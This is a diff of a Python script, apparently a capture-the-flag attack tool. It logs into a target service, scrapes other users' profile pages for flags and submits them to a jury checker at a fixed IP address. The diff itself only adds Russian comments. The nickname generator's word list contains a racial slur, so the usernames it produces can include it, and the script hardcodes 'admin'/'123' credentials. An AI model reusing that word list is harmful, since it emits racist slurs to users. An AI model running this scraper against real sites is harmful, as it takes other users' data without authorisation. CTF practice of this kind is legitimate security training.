@@ -11,7 +11,7 @@ adjectives = ["swift", "brave", "clever", "silent", "golden"]
 nouns = ["eagle", "shadow", "river", "nigger", "mountain", "star"]
 special_chars = ["_", "-", "."]
 
-
+# генерируем рандомный никнейм для пользователя
 def random_nickname():
     adj = random.choice(adjectives)
     noun = random.choice(nouns)
@@ -20,6 +20,7 @@ def random_nickname():
 
     return f"{adj}_{noun}_{char}_{num}"
 
+# отправляем флаг в жюрийку для проверки
 def flag_checker(flag):
     urlz = 'http://62.181.44.12:3000/check-flag?flag='
     request = session.get(url=urlz+flag)
@@ -35,6 +36,7 @@ username = "admin"
 password = "123"
 login_flag = 0
 
+# считываем с файла юзера, у которого уже есть аккаунт, чтобы не регаться заново
 with open("user.txt", "r+") as f:
     get_user_info = f.readline()
     if len(get_user_info) == 0:
@@ -51,9 +53,10 @@ reg_data = {"username": username,
                     "full_name": full_name,
                     "password": password,
                     "confirm_password": password}
-
+# если что-то не так, то парсить флаг мы не будем
 parse_permisson = 0
 
+# логинимся или регистрируемся.
 if login_flag:
     login_post = session.post(url+"/auth/signin", data=reg_data)
     if login_post.status_code == 200:
@@ -85,7 +88,7 @@ while parse_permisson:
         get_user_info = session.get(url=url+user_element) # получаем html-страницу юзера
         soup = BeautifulSoup(get_user_info.text, 'lxml')
         flag_span = soup.find_all("span") # достаем <span> </span>, где лежит флаг
-        username_h1 = soup.find_all("h1") # достаем <span> </span>, где лежит флаг
+        username_h1 = soup.find_all("h1") # достаем логин очередного юзера
         
         print(f"Проверяю пользователя -- {username_h1[0].text}")
 
